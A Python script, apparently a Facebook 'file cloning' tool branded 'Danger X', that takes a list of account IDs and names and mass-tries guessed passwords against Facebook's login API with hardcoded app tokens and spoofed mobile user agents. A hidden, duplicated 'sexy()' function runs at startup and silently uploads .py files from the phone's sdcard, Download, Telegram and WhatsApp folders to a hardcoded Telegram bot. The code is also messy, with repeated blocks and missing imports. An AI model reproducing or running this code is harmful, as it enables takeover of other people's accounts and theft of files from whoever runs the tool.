ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 281.0.0.16.104 (iPhone15,2; iOS 16_2; it_IT; it-IT; scale=3.00; 1179x2556; 470305378) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622)","Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.47 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80","Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022127458","Mozilla/5.0 (Linux; Android 9; Mi A1 Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022131834","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; arm; Android 11; RMX3581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.52.1 YaSearchBrowser/23.52.1 BroPP/1.0 SA/3 Mobile Safari/537.36""Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.43","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/23.5.5.333.10 YaApp_iOS/2305.5 YaApp_iOS_Browser/2305.5 Safari/604.1 SA/3","Mozilla/5.0 (Linux; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 GNews Android/2022091362","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Viewer/99.9.7778.79","Mozilla/5.0 (Linux; 13; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; ms-my; RMX3201 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.3.1.1","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 Instagram 287.0.0.18.74 (iPhone11,6; iOS 16_5; it_IT; it; scale=3.00; 1242x2688; 483425622) NW/3","Mozilla/5.0 (Linux; Android 8.1.0; 5059D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2918.62 Safari/537.36","Mozilla/5.0 (Linux; Android 8.0; PRA-TL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3242 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 Vinebre","Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 11; SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72468","Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898""Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]""Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]"]


def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
#----------------#
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
def l():
    vivo = random.choice(["U3", "1002T", "C", "1605", "730", "A5", "A54", "a57", "A87",
    "C8818", "EGO", "E1", "E3", "E5", "X21", "X21i", "X2s", "X23",
    "iQOO", "X5Max5", "X5V", "X60t", "X6S", "X7", "X70", "Xplay", "Xshot",
    "Y01", "Y01A", "Y02", "Y02s", "V1", "V11", "V11s", "Y13T", "Nex",
    "S1", "S10", "S11", "S11t", "S12", "S13", "S15", "S15e", "S1PRO",
    "S20", "S21", "S31", "S5", "S6", "S6T", "S7", "S76", "S7e",
    "S7t", "S7w", "S9", "S9e", "T1", "T1x", "T2", "T2x", "E1",
    "U10", "U20", "X20", "X1w", "23x", "V77e", "Y613F", "Y628", "X3S",
    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34"])
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/'+str(vivo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua

#----------logo----------#
logo=f"""\033[1;95m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;92m______           _      _                _    
[38;5;46m|  _  \         | |    | |              | |   
\033[1;93m| | | |__ _ _ __| | __ | |__   __ _  ___| | __
[34;1m| | | / _` | '__| |/ / | '_ \ / _` |/ __| |/ /
\033[1;93m| |/ / (_| | |  |   <  | | | | (_| | (__|   < 
[38;5;196m|___/ \__,_|_|  |_|\_\ |_| |_|\__,_|\___|_|\_\                                                                                         
[38;5;46m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤ 
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
\033[1;95m[+]owner:Danger X
[34;1m[+]YouTube:MR DANGER
[38;5;46m[+]Facebook name: M R Danger 
[38;5;196m[+]messenger group:Danger_X
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═"""
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
#----------line----------#
def line():
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' [34;1m[1] FILE CLONING ')
    print(' [38;5;46m[2] EXIT ')
    line()
    option=input(' [??] CHOICE MENU : ')
    if option in ['1','A']:
        __file__()
    else:
        exit(' THANKS FOR USING ')

#----------file----------#
def __file__():
    clear()
    filex=input(' [38;5;46m[??] [34;1mFILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __M__()
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=50) as Dipto:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop,VXV
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r \033[37;1m[Danger-X] %s[38;5;46m|OK-%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [Danger-X-ok] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [Danger-X-cp] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '6501532770:AAEqHjxvUQFUkx2wawQz5SHQxrkzke91tys' 
    chat_id = '6251142250'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '6501532770:AAEqHjxvUQFUkx2wawQz5SHQxrkzke91tys' 
    chat_id = '6251142250'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(main)
with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(main)
#----------end----------#

#----------end----------#
main()
